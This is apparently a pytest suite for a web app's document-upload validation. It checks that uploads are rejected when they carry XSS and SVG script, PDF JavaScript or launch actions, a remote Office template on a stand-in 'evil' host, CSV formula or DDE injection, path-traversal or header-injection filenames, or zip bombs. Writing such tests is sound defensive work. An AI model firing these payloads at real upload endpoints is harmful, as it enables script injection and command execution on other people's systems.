"""Validation of what is uploaded.  THREATS.md: T27, T28, T32."""
from __future__ import annotations

import io
import zipfile

import pytest

from conftest import audit_rows, make_docx, make_pdf, make_png


def upload(client, filename, content, category="general"):
    return client.post("/api/documents", files={"file": (filename, content, "application/pdf")},
                       data={"category": category})


@pytest.mark.parametrize("filename,content", [
    ("ok.pdf", make_pdf()),
    ("ok.png", make_png()),
    ("ok.jpg", b"\xff\xd8\xff\xe0" + b"\x00" * 20 + b"\xff\xd9"),
    ("ok.txt", "Plain UTF-8 text – with unicode ✓\n".encode()),
    ("ok.csv", b"name,amount\nAcme,-12.50\nBeta,+3\n"),
    ("ok.docx", make_docx()),
])
def test_valid_files_are_accepted(world, filename, content):
    assert upload(world["alice"], filename, content).status_code == 201


@pytest.mark.parametrize("filename,content,why", [
    ("payload.exe", b"MZ\x90\x00", "executable extension"),
    ("invoice.pdf", b"MZ\x90\x00\x03\x00\x00\x00", "executable renamed to .pdf"),
    ("page.html", b"<script>alert(1)</script>", "html can run script on our origin"),
    ("logo.svg", b"<svg onload=alert(1)>", "svg can run script"),
    ("image.png", b"<script>alert(1)</script>", "html pretending to be png"),
    ("js.pdf", make_pdf(b"/OpenAction << /S /JavaScript /JS (app.alert(1)) >>"), "pdf javascript"),
    ("hex.pdf", make_pdf(b"/OpenAction << /S /J#61vaScript >>"), "hex-escaped pdf javascript"),
    ("launch.pdf", make_pdf(b"/Launch /F (cmd.exe)"), "pdf launch action"),
    ("trunc.pdf", b"%PDF-1.4\n1 0 obj", "truncated pdf"),
    ("macro.docx", make_docx({"word/vbaProject.bin": b"\x00" * 10}), "office macro"),
    ("macro2.docx", make_docx(content_types=b"<Types>application/vnd.ms-word.document.macroEnabled</Types>"), "macro content type"),
    ("remote.docx", make_docx({"word/_rels/settings.xml.rels":
                               b'<Relationships><Relationship Type="http://schemas.openxmlformats.org/officeDocument/'
                               b'2006/relationships/attachedTemplate" Target="http://evil/t.dotm" '
                               b'TargetMode="External"/></Relationships>'}), "remote template injection"),
    ("notdocx.docx", b"PK\x03\x04garbage", "corrupt zip"),
    ("wrongkind.xlsx", make_docx(), "docx renamed to xlsx"),
    ("nul.txt", b"hello\x00world", "binary in text"),
    ("latin1.txt", "café".encode("latin-1"), "not utf-8"),
    ("esc.txt", b"red \x1b[31m text", "terminal escape codes"),
    ("formula.csv", b"name,total\nAcme,=HYPERLINK(\"http://evil\")\n", "csv formula injection"),
    ("formula2.csv", b"a,b\n@SUM(1+1),2\n", "csv @ formula"),
    ("formula3.csv", b"a,b\n-2+3+cmd|' /C calc'!A0,1\n", "csv dde"),
    ("empty.pdf", b"", "empty file"),
    ("noext", b"hello", "no extension"),
    ("big.png", make_png(1, 1)[:16] + (100000).to_bytes(4, "big") + (100000).to_bytes(4, "big") + make_png()[24:],
     "decompression bomb dimensions"),
])
def test_dangerous_files_are_rejected(world, db, filename, content, why):
    before = db.execute("SELECT COUNT(*) FROM documents").fetchone()[0]
    r = upload(world["alice"], filename, content)
    assert r.status_code == 400, f"{why}: {r.status_code} {r.text}"
    assert db.execute("SELECT COUNT(*) FROM documents").fetchone()[0] == before
    assert audit_rows(db, action="document.upload", outcome="denied"), "rejected upload not audited"


def test_zip_bomb_is_rejected(world):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/document.xml", "<w/>")
        zf.writestr("word/bomb.xml", b"\x00" * (50 * 1024 * 1024))
    assert len(buf.getvalue()) < 1024 * 1024
    r = upload(world["alice"], "bomb.docx", buf.getvalue())
    assert r.status_code == 400 and "zip bomb" in r.json()["detail"]


def test_oversized_upload_is_refused_before_parsing(world):
    r = upload(world["alice"], "huge.txt", b"a" * (3 * 1024 * 1024))  # limit is 1 MB in tests
    assert r.status_code in (400, 413)


def test_filename_is_sanitised(world, db):
    doc_id = upload(world["alice"], "../../..\\windows\\evil‮txt.pdf", make_pdf()).json()["id"]
    name = db.execute("SELECT original_filename FROM document_versions WHERE document_id = ?", (doc_id,)).fetchone()[0]
    assert "/" not in name and "\\" not in name and ".." not in name and "‮" not in name
    assert name.endswith(".pdf")


def test_header_injection_through_filename_is_impossible(world):
    doc_id = upload(world["alice"], 'report";\r\nSet-Cookie: x=1.pdf', make_pdf()).json()["id"]
    r = world["alice"].get(f"/api/documents/{doc_id}/download")
    assert r.status_code == 200
    assert "set-cookie" not in {k.lower() for k in r.headers.keys()}
    assert r.headers["content-disposition"].startswith("attachment;")


def test_client_content_type_is_ignored(world, db):
    r = world["alice"].post("/api/documents", files={"file": ("x.pdf", make_pdf(), "text/html")},
                            data={"category": "general"})
    doc_id = r.json()["id"]
    mime = db.execute("SELECT mime_type FROM document_versions WHERE document_id = ?", (doc_id,)).fetchone()[0]
    assert mime == "application/pdf"


def test_viewer_and_admin_cannot_upload(world):
    assert upload(world["carol"], "x.pdf", make_pdf()).status_code == 403
    assert upload(world["admin"], "x.pdf", make_pdf()).status_code == 403


def test_invalid_category_rejected(world):
    assert upload(world["alice"], "x.pdf", make_pdf(), category="secret-stuff").status_code == 400


def test_new_version_is_validated_too(world):
    r = world["dave"].post(f"/api/documents/{world.doc_a}/versions",
                           files={"file": ("v2.pdf", b"<html>", "application/pdf")})
    assert r.status_code == 400
